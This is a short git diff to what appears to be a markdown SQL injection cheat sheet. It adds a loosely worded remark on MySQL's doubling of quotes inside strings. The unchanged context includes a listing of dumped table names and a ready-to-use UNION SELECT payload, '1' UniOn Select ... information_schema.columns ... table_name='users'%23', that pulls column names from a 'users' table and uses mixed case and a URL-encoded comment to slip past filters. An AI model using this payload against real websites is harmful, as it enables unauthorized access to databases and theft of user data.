@@ -51,7 +51,24 @@ OUTPUT:     |testtable1|,|userlogs|,|users|
 
 #### Extract COLUMNS NAME
 
->>> REMEMBER USE SINGLE QUOTE  <<<
+>>> REMEMBER USE SINGLE QUOTE  
+
+```
+
+In mysql there is a particularity
+
+String inside strings duplicate quotes!
+
+' blablabla ''string'' '
+
+String >> string >> string
+
+'blablabla '' blablabla '''' string '''' '' '
+
+This used with frequency in mysql links.
+
+```
+
 
 `1' UniOn Select 1,gRoUp_cOncaT(0x7c,column_name,0x7C),3+fRoM+information_schema.columns+wHeRe+table_name='users'%23`
 
